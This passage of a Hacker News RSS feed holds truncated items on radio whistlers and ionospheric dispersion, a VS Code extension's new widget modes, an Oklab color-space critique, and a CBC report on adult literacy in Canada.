<p>So…, a bunch of frequencies is generated by a lightning strike at a location, <em>at the same time</em>. All of them take the same path and reach another location. So, ideally we should be receiving all the frequencies at the same time. But we hear a tone of descending frequency. <strong>Why?</strong></p>

<p>The reason lies in the ionosphere. The velocity of propagation of a wave through the ionosphere is dependent on it’s frequency. This leads to a dispersion of waves, with each frequency traveling at a different speed.</p>

<p><img title="graph of $1/\sqrt{f} vs t" src="https://aklsh.now.sh/blog/Whistler%20post/Figures/Graph.png"></p>

<p>Graph of $\frac{1}{\sqrt{f}}$ vs $t$ (time of arrival)</p>
<p>Source: <i>Robert A. Helliwell</i>, Whistlers and Related Ionospheric Phenomena, Stanford University Press, 1965</p>

<p>Due to the dispersion of waves in the ionosphere depending on their frequencies, different frequencies are received at different times, with the higher frequencies being received first, as seen from the above graph. This is why a whistler is a tone of descending frequency.</p>

<h3 id="detection-of-whistlers">Detection of Whistlers<a href="#detection-of-whistlers">#</a></h3>

<p>The theory’s great. But how do we practically detect and hear these sounds?</p>

<p>Since these are electromagnetic waves, we have to first “capture” these EM waves, then transduce them, i.e. convert them to audio to actually hear the audio clips you heard before.</p>

<p>The wavelength of these waves are extremely huge (100 km for a 3KHz wave). This means that it is not possible to have a <a href="http://www.antenna-theory.com/antennas/dipole.php">full-wavelength antenna</a>, for capturing the wave accurately. A typical VLF receiver is about 60ft long - there is very little signal current for reception. Using a cascaded combination of high gain, high input impedance (for better sensitivity) amplifiers and low pass filters, we can make up for the difference.</p>

<p><img title="VLF Receiver Circuit" src="https://aklsh.now.sh/blog/Whistler%20post/Figures/receiver-circuit.png"></p>

<p>VLF Receiver Circuit</p>
<p>Source: <i>http://www.home.pon.net/785/equipment/build_your_own.htm</i></p>

<h3 id="whistler-spectrograms-a-vast-ocean-of-information">Whistler Spectrograms - a vast ocean of information<a href="#whistler-spectrograms-a-vast-ocean-of-information">#</a></h3>

<p>What’s a <em>spectrogram</em>?</p>

<blockquote>
<p>A spectrogram is a visual representation of the spectrum of frequencies of a signal as it varies with time <sup id="fnref:1"><a href="#fn:1">1</a></sup>.</p>
</blockquote>

<p>Basically it is a graph, with x-axis as time (usually), y-axis as frequency and the intensity/amplitude at a point $(f, t)$ is given by it’s color.</p>

<p><img title="spectrogram example" src="https://aklsh.now.sh/blog/Whistler%20post/Figures/Fig%201.jpg">
</p><p>Whistler spectrogram</p>
<p>Source: <i><a href="https://en.wikipedia.org/wiki/Whistler_(radio">https://en.wikipedia.org/wiki/Whistler_(radio</a>)</i></p>

<p>This is a real-life spectrogram of a whistler. At around <strong>0355:29</strong>, you can a see a band of frequencies being generated. This is called a <em>tweek</em>.</p>

<p><img title="spectrogram example" src="https://aklsh.now.sh/blog/Whistler%20post/Figures/Fig%201-mark-tweek.jpg">
</p><p>Tweek in a spectrogram</p>

<p>At near <strong>0355:31</strong>, you see that the “tone of descending frequencies” has started. Notice how there’s a time delay between the tweek and the start of the whistler. This tells us that it is detected elsewhere (remember the magnetically conjugate point?), meaning it has travelled (or the whistler has been detected at the same place as the tweek.)</p>

<p>According to <a href="https://en.wikipedia.org/wiki/Robert_Helliwell">Robert A. Helliwell</a>, in his book <em>Whistlers and Related Ionospheric Phenomena</em>, the idealised spectrogram for a whistler is:
<img title="ideal-spectrogram" src="https://aklsh.now.sh/blog/Whistler%20post/Figures/Fig%202.png"></p>

<p>Ideal whistler spectrograms</p>
<p>Source: <i>Robert A. Helliwell</i>, Whistlers and Related Ionospheric Phenomena, Stanford University Press, 1965</p>

<p>There’s a lot more in the above diagram than just ideal spectrograms. The figure shows us a wealth of information.</p>

<p>If you look closely, we can see the ideal spectrogram containing all the “<em>reflections</em>” of the whistler.</p>

<p><strong>Hold On!</strong> Where did reflections come from?
Well, as I had mentioned that it propagates, I had mentioned that the tweek generated would travel into an ionospheric duct, then come back into the earth-ionosphere waveguide. Well, EM waves, in fact any wave, simply don’t do nothing when they travel from one medium to another.</p>

<p>Because of the change in refractive indices of the media, some of the energy carried by the waves will be reflected into the first medium, and the rest will be transmitted into the second (there’s also absorption of energy, but I’m ignoring that as it is very less compared to the other two).</p>

<p>In this part of the above figure,
<img title="box1" src="https://aklsh.now.sh/blog/Whistler%20post/Figures/Fig%202-box1.png">
we can see the tweek, and also a number of whistlers, each dragged out more than the previous. Such whistlers are detected at the same place of origin of the tweek. They are called as <em><strong>Odd-Hop Whistlers</strong></em>, since they have “hopped” or “jumped” (i.e. reflected) an odd number of times.</p>

<p><em>Why are they getting dragged out more?</em> Because, each undergoes a greater amount of dispersion than the previous as they travel a lot more distance after each reflection before detecting them.</p>

<p>Similarly, in this part of the figure,
<img title="box2" src="https://aklsh.now.sh/blog/Whistler%20post/Figures/Fig%202-box2.png">
we can see all the <em><strong>Even-Hop Whistlers</strong></em>, and these are detected at the magnetically conjugate point to the point of origin of the tweek.</p>

<p>I had mentioned that the waves get dispersed in the ionosphere, right? Well, later studies showed that according to dispersion theory, every whistler should have a characteristic frequency (not necessarily the maximum frequency detected), that has the minimum time delay. This frequency is called <em>the nose …</em></p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://aklsh.now.sh/blog/whistlers/">https://aklsh.now.sh/blog/whistlers/</a></em></p>]]>
            </description>
            <link>https://aklsh.now.sh/blog/whistlers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25830624</guid>
            <pubDate>Tue, 19 Jan 2021 06:28:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A homescreen mode for every mood in VS Code]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25830593">thread link</a>) | @admc
<br/>
January 18, 2021 | https://marquee.activecove.com/blog/a-homescreen-mode-for-every-mood-in-vs-code | <a href="https://web.archive.org/web/*/https://marquee.activecove.com/blog/a-homescreen-mode-for-every-mood-in-vs-code">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p><img src="https://storage.googleapis.com/ac-strapi-cms.appspot.com/modes_cover_0a372a29bf/modes_cover_0a372a29bf.jpg" alt="Modes cover"></p>
<p>Do you find yourself losing focus when you see the Reddit news feed, but want it a few minutes later when you're taking a break? If you use Marquee in VS Code, we released a new feature in version 1.3.0 that you need to know about.</p>
<blockquote>
<p>If you don't use Marquee, you should <a href="https://marketplace.visualstudio.com/items?itemName=activecove.marquee">install it now</a>.</p>
</blockquote>
<p>We now allow you to create and customize groups of widgets and quickly switch back and forth between them, depending on your flow-state. We know that some of the infotainment widgets can be distracting, so we made it easy for you to see exactly what you want, when you want it.</p>
<p><img src="https://storage.googleapis.com/ac-strapi-cms.appspot.com/modes_simple_min_7225763199/modes_simple_min_7225763199.gif" alt="Modes walkthrough"></p>
<p>As you switch back and forth, your dashboard and Marquee tree panel will instantly update to display content for the selected mode. Once you select a mode, all changes to size and positioning of those widgets will be saved so it stays just the way you want it.</p>
<p>We've provided a few default modes based on the widgets we think are best for working, or surfing infotainment, but it's really easy to create your own!</p>
<p><img src="https://storage.googleapis.com/ac-strapi-cms.appspot.com/modes_add_min_48b3ba31d2/modes_add_min_48b3ba31d2.gif" alt="Add modes"></p>
<p>A few hidden gems include the ability to do a full reset using the vertical fly out on the modes configuration page, and the ability to duplicate any of your custom modes to quickly create and customize a new mode.</p>

<p><img src="https://storage.googleapis.com/ac-strapi-cms.appspot.com/feedback_modes_e8cc9157b4/feedback_modes_e8cc9157b4.png" alt="Marquee feedback"></p>
<p>Additionally, we've added a few options for getting in touch or providing us feedback. By clicking the feedback button in the navigation bar, you now get the option to open Intercom and chat with us in realtime or simply submit feedback with a form — the way you always have.</p>
<p><img src="https://storage.googleapis.com/ac-strapi-cms.appspot.com/feedback_min_9976373a04/feedback_min_9976373a04.gif" alt="Feedback walkthrough"></p>
<p>Thanks for reading, and let us know what widgets you want next!</p>
</div></div></div></div>]]>
            </description>
            <link>https://marquee.activecove.com/blog/a-homescreen-mode-for-every-mood-in-vs-code</link>
            <guid isPermaLink="false">hacker-news-small-sites-25830593</guid>
            <pubDate>Tue, 19 Jan 2021 06:21:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Society of Mind – Marvin Minsky (1988)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25830451">thread link</a>) | @cableclasper
<br/>
January 18, 2021 | http://aurellem.org/society-of-mind/ | <a href="https://web.archive.org/web/*/http://aurellem.org/society-of-mind/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://aurellem.org/society-of-mind/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25830451</guid>
            <pubDate>Tue, 19 Jan 2021 05:51:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An interactive review of the Oklab perceptual color space]]>
            </title>
            <description>
<![CDATA[
Score 87 | Comments 16 (<a href="https://news.ycombinator.com/item?id=25830327">thread link</a>) | @raphlinus
<br/>
January 18, 2021 | https://raphlinus.github.io/color/2021/01/18/oklab-critique.html | <a href="https://web.archive.org/web/*/https://raphlinus.github.io/color/2021/01/18/oklab-critique.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    



<p>Björn Ottosson recenty published a blog post introducing <a href="https://bottosson.github.io/posts/oklab/">Oklab</a>. The blog claimed that Oklab is a better perceptual color space than what came before. It piqued my interest, and I wanted to see for myself.</p>

<p>In exploring perceptual color spaces, I find an interactive gradient tool to be invaluable, so I’ve reproduced one here:</p>





<!--Jerry-rigged color picker-->




<h2 id="why-and-when-a-perceptual-color-space">Why (and when) a perceptual color space?</h2>

<p>Most image processing is done using a device color space (most often <a href="https://en.wikipedia.org/wiki/SRGB">sRGB</a>), and most libraries and interfaces expose that color space. Even when an image editing tool or a standard (such as CSS) exposes other color spaces, it’s still most common to use the device color space. But for some use cases, a perceptual color space can give better results.</p>

<p>Basically <em>the</em> central question of color theory is how colors (in the physical sense) are perceived. The trichromacy assumption basically groups colors into equivalence classes in a three-dimensional space, and display devices generally produce colors by mixing three additive primaries: the familiar red, green, and blue.</p>

<p>In an ideal perceptual color space, the distance of two points in the space would correlate strongly with the <em>perception</em> of color difference. Put another way, all pairs separated by a “just noticeable difference” would be separated by an equal distance.</p>

<p>As it turns out, such a thing is no more possible than flattening an orange peel, because color perception is inherently <a href="https://www.researchgate.net/publication/2900785_Non-Euclidean_Structure_of_Spectral_Color_Space">non-Euclidean</a>. To put it another way, the ratio of perceptually distinct steps around a hue circle to those directly across through gray is greater than would be expected as a circle in an ordinary Euclidean space.</p>

<p>Even so, like map projections, it is possible to make a color space that approximates perceptual uniformity and is useful for various tasks. One of these, a primary focus of this blog post, is smoother gradients.</p>

<p>Gradients are of course very similar to color scales, and a good perceptual color space can be used as the basis for those. An even better approach is to use a real color appearance model, as was done in <a href="https://www.youtube.com/watch?v=xAoljeRJ3lU">A Better Default Colormap for Matplotlib</a>, and is well explained and motivated in that video (it contains a brief introduction to color science as well).</p>

<p>A major application of perceptual color spaces is image manipulation, especially changing the color saturation of an image. This is a particular place where hue uniformity is important, as you don’t want hues to shift. Also, prediction of lightness is especially important when transforming a color image to black and white.</p>

<p>Perceptual color spaces are also a good basis for programmatic manipulation of color palettes, for example to create sets of colors in particular relation to each other, or to derive one of dark and light mode from the other. For example, the normal/hover/active/disabled states of a button may be different lightness and saturation values of the same hue, so hue shift would be undesirable. In particular, I think a future evolution of the standard <a href="https://en.wikipedia.org/wiki/Blend_modes">Blend modes</a> should have at least the option to do the blending in a high quality perceptual color space.</p>

<p>And, as mentioned by Björn, a color picker widget can benefit from a good perceptual space. It should be possible to adjust lightness and saturation without affecting hue, in particular.</p>

<p>Much of the literature on perceptual color spaces is geared to image compression, with two primary motivations. First, as compression adds errors, you generally want those errors distributed evenly in perceptual space; it wouldn’t be good at all to have artifacts that appear more prominently in areas of a particular shade. Second, good compression depends on a clean separation of lightness and chroma information, as the latter can be compressed better.</p>

<p>All that said, there are definitely cases where you do <em>not</em> want to use a perceptual space. Generally for image filtering, antialiasing, and alpha compositing, you want to use a linear space (though there are subtleties here). And there are even some cases you want to use a device space, as the device gamut is usually nice cube there, while it has quite the complex shape in other color spaces.</p>

<h2 id="focus-on-gradients">Focus on gradients</h2>

<p>This blog post will use gradients as the primary lens to study perceptual color spaces. They are a very sensitive instrument for certain flaws (especially lack of hue uniformity), and a useful goal in and of itself.</p>

<h2 id="no-one-true-gamma">No one true gamma</h2>

<p>The transfer function for neutral colors is the literal backbone of any color space. Commonly referred to as “gamma,” it is one of the most commonly misunderstood topics in computer graphics. <a href="http://poynton.ca/PDFs/Poynton-2018-PhD.pdf">Poynton’s thesis</a> is a definitive account, and I refer the interested reader there, but will try to summarize the main points.</p>

<p>An ideal transfer function for gradients will have perceptually equal steps from black to white. In <em>general,</em> the transfer function in CIELAB is considered close to perceptually uniform, but as always in color perception, the truth is a bit more complicated.</p>

<p>In particular, perception depends on viewing conditions. That includes the ambient light, but also the surround; the same gradient surrounded by white will appear darker than when surrounded by black. For an extremely compelling demonstration of the power of surround to affect the perception of lightness, see <a href="http://www.ritsumei.ac.jp/~akitaoka/index-e.html">Akiyoshi’s illusion pages</a>, for example <a href="http://www.psy.ritsumei.ac.jp/~akitaoka/light2e.html">this one</a>.</p>

<p>Another complication is that the light received by the eye includes so-called “veiling glare,” a fraction of ambient light reflected by the monitor because its black is not a perfect absorber (veiling glare is much less of a problem in movie-like conditions).</p>

<p>The actual CIELAB transfer function is not a perfect cube-root rule, but rather contains a linear segment in the near-black region (the sRGB transfer function is similar but has different parameters). This segment increases perceptual uniformity of ramps in the presence of veiling glare, and also makes the transform robustly invertible using lookup tables.</p>

<p>There is good science on how perception varies with viewing conditions, and the <a href="https://en.wikipedia.org/wiki/CIECAM02">CIECAM</a> color appearance model has parameters that can fine-tune it when these are known. But in practice, viewing conditions are not known, and the best approach is to adopt a best guess or compromise.</p>

<h3 id="hdr">HDR</h3>

<p>HDR is a different story, and I need to go into it to explain the <a href="https://en.wikipedia.org/wiki/ICtCp">ICtCp</a> color space.</p>

<p>In standard dynamic range, you basically assume the visual system is adapted to a particular set of viewing conditions (in fact, <a href="https://en.wikipedia.org/wiki/SRGB">sRGB</a> specifies an exact set of viewing conditions, including monitor brightness, white point, and room lighting). A perceptually uniform gradient from black to white is also useful for image coding, because if you set number of steps so that each individual step is <em>just</em> imperceptible, it uses a minimum number of bits for each sample while faithfully rendering the image without artifacts. And in sRGB, 256 level is just barely enough for most uses, though steps are often visible when displaying gradients, the case where the eye is most sensitive to quantization errors.</p>

<p>In HDR, however, this approach doesn’t quite work. Because of the wider range of brightness values from the display device, and also weaker assumptions about the viewing conditions (darkened rooms are common for movie viewing), the human visual system might at any time be adapted to quite light or quite dark viewing conditions. In the latter case, it would be sensitive to much finer gradations in near-black shades than when adapted to lighter conditions, and a similar situation is true the other way around. If tuned for any one single brightness level, results will be good when adaptation matches, but poor otherwise.</p>

<p>Thus, HDR uses a different approach. It uses a model (known as the Barten model, and shown in Figure 4.6 of <a href="http://poynton.ca/PDFs/Poynton-2018-PhD.pdf">Poynton’s thesis</a>) of the minimum contrast step perceptible at each brightness level, over all possible adaptation conditions. The goal is to determine a sequence of steps so that each step is just under the threshold of what’s perceptible under <em>any</em> viewing conditions.</p>

<p>The SMPTE ST 2084 transfer function is basically a mathematical curve-fit to the empirical Barten model, and has the property that with 12 bits of code words, each step is just under 0.9 of the minimum perceptual difference as predicted by the Barten model, across a range from 0.001 to 10,000 nits of brightness (7 orders of magnitude). There’s lots more detail and context in the presentation <a href="https://www.avsforum.com/attachments/smpte-2014-05-06-eotf-miller-1-2-handout-pdf.1347114/">A Perceptual EOTF for Extended
Dynamic Range Imagery</a> (PDF).</p>

<p>That said, though it’s sophisticated and an excellent fit to the empirical Barten curve, it is <em>not</em> perceptually uniform at any one particular viewing condition. In particular, a ramp of the ST 2084 curve will dwell far too long near-black (representing a range that would be more visible in dark viewing conditions). To see this for yourself, try the black+white button in the interactive explorer above.</p>

<h3 id="a-comparison-of-curves">A comparison of curves</h3>

<p>We can basically place curves on a scale from “way too dark” (ST 2084) to “way too light” (linear light), with all the others in between. CIELAB is a pretty good median (though this may express my personal preference), with IPT a bit lighter and Oklab a bit darker.</p>

<p><img src="https://raphlinus.github.io/assets/colorspace_transfer_functions.png" width="575"></p>

<p>I found Björn’s arguments in favor of pure cube root to be not entirely compelling, but this is perhaps an open question. Both CIELAB and sRGB use a finite-derivative region near black. Is it important to limit derivatives for more accurate LUT-based calculation? Perhaps in 2021, we will almost always prefer ALU to LUT. The conditional part is also not ideal, especially on GPUs, where branches can hurt performance. I personally would explore transfer functions of the form $f(x) = a + (b + cx)^\gamma$, constrained so $f(0) = 0$ and $f(1) = 1$, as these are GPU-friendly and have smooth derivatives. The XYB color space used in JPEG XL apparently uses a bias rather than a piecewise linear region, as well. (Source: <a href="https://news.ycombinator.com/item?id=25525726">HN thread on Oklab</a>, as I wasn’t easily able to …</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://raphlinus.github.io/color/2021/01/18/oklab-critique.html">https://raphlinus.github.io/color/2021/01/18/oklab-critique.html</a></em></p>]]>
            </description>
            <link>https://raphlinus.github.io/color/2021/01/18/oklab-critique.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25830327</guid>
            <pubDate>Tue, 19 Jan 2021 05:32:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Nearly half of adult Canadians struggle with literacy]]>
            </title>
            <description>
<![CDATA[
Score 45 | Comments 88 (<a href="https://news.ycombinator.com/item?id=25829959">thread link</a>) | @cloudedcordial
<br/>
January 18, 2021 | https://www.cbc.ca/radio/costofliving/let-s-get-digital-from-bitcoin-to-stocktok-plus-what-low-literacy-means-for-canada-s-economy-1.5873703/nearly-half-of-adult-canadians-struggle-with-literacy-and-that-s-bad-for-the-economy-1.5873757 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/radio/costofliving/let-s-get-digital-from-bitcoin-to-stocktok-plus-what-low-literacy-means-for-canada-s-economy-1.5873703/nearly-half-of-adult-canadians-struggle-with-literacy-and-that-s-bad-for-the-economy-1.5873757">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>One in six adult Canadians falls short of passing the most basic set of literacy tests, making them functionally illiterate, and this could mean problems as a post-COVID-19 economic recovery ramps up.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5874914.1610831423!/cumulusImage/httpImage/image.jpg_gen/derivatives/16x9_780/shutterstock-dictionary-picture.jpg"></p></div><figcaption>Poor reading and writing skills make up a literacy gap in Canada. Experts say the gap is due in part to an abundance of jobs in the past that do not require the daily use of reading comprehension and information synthesis skills.<!-- --> <!-- -->(FabrikaSimf/Shutterstock)</figcaption></figure><p><span><div><div role="button" tabindex="0" title="Low literacy in Canada is affecting both democracy and the economy"><div><p><img src="https://thumbnails.cbc.ca/maven_legacy/thumbnails/259/807/costofliving-640x360.jpg" alt=""></p><p><span>Cost of Living</span><span>10:19</span><span>Low literacy in Canada is affecting both democracy and the economy</span></p></div></div></div></span></p><p><span><p>Nearly half of Canada's population has a big roadblock ahead of them when it comes to post-pandemic economic recovery — and it's not the novel coronavirus but&nbsp;a fundamental set of skills for daily life.</p>  <p>Poor reading, writing and numeracy skills in adults make up a literacy gap in Canada with&nbsp;consequences for both democracy and the economy.&nbsp;Experts say the gap is&nbsp;due in part to an abundance of jobs in the past that do not require the daily use of reading comprehension and information synthesis skills.</p>  <ul>   <li><strong>The Cost of Living ❤s money — how it makes (or breaks) us.<br> Catch us Sundays on CBC Radio One&nbsp;at 12:00 p.m. (12:30 p.m. NT).</strong><br> <strong>We also repeat the following Tuesday at 11:30 a.m. in most provinces.</strong></li>  </ul>  <p>In short, literacy is not like riding a bike. While Canadians tend to leave the high school level with these skills, it takes practice to retain them and Canada's economy does not provide the opportunity to do that for many&nbsp;workers.</p>  <p>Despite relatively high education rates, an analysis of international assessments by Statistics Canada in 2013 showed that more than&nbsp;<a href="https://www150.statcan.gc.ca/n1/pub/89-555-x/89-555-x2013001-eng.pdf">one in six</a> adult Canadians fell short of passing the most basic set of literacy tests.</p>  <p>The&nbsp;<a href="https://www.oecd.org/skills/piaac/publications/">Programme for the International Assessment of Adult Competencies</a> (PIACC) looks at how adults process information and how they use literacy, mathematics and problem solving both at home and at work.</p>    <blockquote><span><span><svg version="1.1" focusable="false" x="0px" y="0px" width="30px" height="25px" viewBox="0 0 52.157 39.117" enable-background="new 0 0 52.157 39.117" space="preserve"><g><g><path fill="000000" d="M22.692,10.113c-5.199,1.4-8.398,4.4-8.398,8.801c0,2.4,2,3,3.6,4.199c2.2,1.602,3.4,3.4,3.4,6.602   c0,3.799-3.4,6.799-7.4,6.799c-4.6,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z M45.692,10.113   c-5.199,1.4-8.399,4.4-8.399,8.801c0,2.4,2,3,3.601,4.199c2.2,1.602,3.399,3.4,3.399,6.602c0,3.799-3.399,6.799-7.399,6.799   c-4.601,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z"></path></g></g><g display="none"><g display="inline"> <path fill="000000" d="M6.648,29.759c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.399-3.4-3.399-6.6   c0-3.801,3.399-6.801,7.399-6.801c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z M29.648,29.759   c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.401-3.4-3.401-6.6c0-3.801,3.401-6.801,7.401-6.801   c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z"></path></g></g></svg>If you're working in a particular role, whatever it is, where reading and writing isn't necessarily a big part of the job, those skills may erode over time.<svg focusable="false" x="0px" y="0px" width="23px" height="22px" viewBox="0 0 52.157 39.117" enable-background="new 0 0 52.157 39.117" space="preserve"><g display="none"><g display="inline"><path fill="000000" d="M22.692,10.113c-5.199,1.4-8.398,4.4-8.398,8.801c0,2.4,2,3,3.6,4.199c2.2,1.602,3.4,3.4,3.4,6.602   c0,3.799-3.4,6.799-7.4,6.799c-4.6,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z M45.692,10.113   c-5.199,1.4-8.399,4.4-8.399,8.801c0,2.4,2,3,3.601,4.199c2.2,1.602,3.399,3.4,3.399,6.602c0,3.799-3.399,6.799-7.399,6.799   c-4.601,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z"></path></g></g><g><g><path fill="000000" d="M6.648,29.759c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.399-3.4-3.399-6.6   c0-3.801,3.399-6.801,7.399-6.801c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z M29.648,29.759   c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.401-3.4-3.401-6.6c0-3.801,3.401-6.801,7.401-6.801   c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z"></path></g></g></svg></span><cite>- Michael Burt, Conference Board of Canada</cite></span></blockquote>    <p>Canada's results, which have not substantially changed since the first PIACC, show that&nbsp;many in this country&nbsp;are unable to complete ordinary tasks, such as filling out a job application, reading a news article or sending an email.&nbsp;</p>  <p>About half the adult population fell short of passing a&nbsp;high school level of assessment, by testing the ability to&nbsp;<a href="https://www150.statcan.gc.ca/n1/pub/89-555-x/2013001/t/tbl1.1-eng.htm">digest&nbsp;lengthier</a>&nbsp;and more complex texts&nbsp;while&nbsp;processing the information accurately.</p>  <p>"Generally speaking, we're below average compared to other OECD [Organization for Economic Co-operation and Development]&nbsp;countries in terms of adult literacy, numeracy skills," said Michael Burt, an economist with the Conference Board of Canada.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.2850745.1417013996!/fileImage/httpImage/image.JPG_gen/derivatives/original_300/michaelburt.JPG 300w,https://i.cbc.ca/1.2850745.1417013996!/fileImage/httpImage/image.JPG_gen/derivatives/original_460/michaelburt.JPG 460w,https://i.cbc.ca/1.2850745.1417013996!/fileImage/httpImage/image.JPG_gen/derivatives/original_620/michaelburt.JPG 620w,https://i.cbc.ca/1.2850745.1417013996!/fileImage/httpImage/image.JPG_gen/derivatives/original_780/michaelburt.JPG 780w,https://i.cbc.ca/1.2850745.1417013996!/fileImage/httpImage/image.JPG_gen/derivatives/original_1180/michaelburt.JPG 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.2850745.1417013996!/fileImage/httpImage/image.JPG_gen/derivatives/original_780/michaelburt.JPG"></p></div><figcaption>Conference Board of Canada economist Michael Burt points to the country's resource-based economy as one reason for lower literacy rates. Canadians aren't always forced to read and write as much to support themselves economically.<!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <p>The not-for-profit research organization&nbsp;gave Canada a <a href="https://www.conferenceboard.ca/hcp/provincial/education/adlt-lowlit.aspx">"C" grade in adult literacy</a> back in 2014.</p>  <p>"I think it really boils down to&nbsp;[Canadians]&nbsp;have a competitiveness challenge," he told CBC Radio's <em>Cost of Living</em>. "We cannot stand still because our competitors certainly are not."</p>  <p>Countries that score higher than Canada in&nbsp;<a href="http://www.oecd.org/skills/">the international skills assessment</a>, which&nbsp;Statistics Canada participates in, include Japan, Australia, Sweden, Finland and Holland.</p>  <h2>The literacy gap is not limited to immigrants</h2>  <p>Unsurprisingly, new Canadians with a native language other than English or French appear in the&nbsp;lowest literacy category at a higher rate&nbsp;than their Canadian-born counterparts.</p>  <p>In some provinces, immigrants with a very high literacy score actually represented a higher proportion than the Canadian-born population. Statistics Canada's analysis of the PIAAC data indicated that more&nbsp;"established immigrants," who had been in Canada longer, were represented in the lowest literacy groups at roughly&nbsp;the same proportion as those born in the country.</p>    <p>However, the lowest-scoring groups&nbsp;also include&nbsp;a significant number of Indigenous people in Canada, as well as English and French speakers&nbsp;born in this country.</p>  <p>It's important to separate out those born in Canada from&nbsp;those born abroad, because while some immigrants may struggle with a new language, a significant number also have extensive job experience and education&nbsp;and are highly skilled in their original languages.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5876360.1610817959!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/monica-das.jpg 300w,https://i.cbc.ca/1.5876360.1610817959!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/monica-das.jpg 460w,https://i.cbc.ca/1.5876360.1610817959!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/monica-das.jpg 620w,https://i.cbc.ca/1.5876360.1610817959!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/monica-das.jpg 780w,https://i.cbc.ca/1.5876360.1610817959!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/monica-das.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5876360.1610817959!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/monica-das.jpg"></p></div><figcaption>Monica Das, executive director of Edmonton's Project Adult Literacy Society, says it's important to recognize that low literacy doesn't mean a lack of skills.<!-- --> <!-- -->(Submitted by Monica Das)</figcaption></figure></span></p>  <p>Those&nbsp;born and raised in Canada who struggle with language, math and computer proficiency, on the other hand, are less visible because, as advocates put it, they're very good at "faking it."</p>  <p>"They tend to hide this fact from everyone because of the fear of being called names," said Monica Das, executive director of Project Adult Literacy Society (PALS) in Edmonton.</p>  <p>"'Dumb, stupid, crazy, handicapped' and other words are used to describe you as soon as you identify yourself as someone who struggles with reading and writing."</p>  <h2>Deep 'shame' felt by native English speakers</h2>  <p>Native English speakers make up about half of the clients who turn to PALS for help, Das&nbsp;said.</p>  <p>Eddy Piché, 59, is one of them.</p>  <p>The Edmontonian spent nearly 30 years driving trucks all over Ontario and Alberta before coming to terms with what he called his "shame."</p>  <p>"Some people, like, come out of college, university, they use big words and all that stuff," Piché said. "They make you feel you really can't do this, can't do that. You feel shame."</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5876352.1610817552!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/eddy-piche.jpg 300w,https://i.cbc.ca/1.5876352.1610817552!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/eddy-piche.jpg 460w,https://i.cbc.ca/1.5876352.1610817552!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/eddy-piche.jpg 620w,https://i.cbc.ca/1.5876352.1610817552!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/eddy-piche.jpg 780w,https://i.cbc.ca/1.5876352.1610817552!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/eddy-piche.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5876352.1610817552!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/eddy-piche.jpg"></p></div><figcaption>Eddy Piché's options for work were limited because with lower literacy skills, he couldn't fill out job applications. Retraining allowed him to move from driving a truck into a job as a social worker, but he had to overcome the 'shame' of illiteracy.<!-- --> 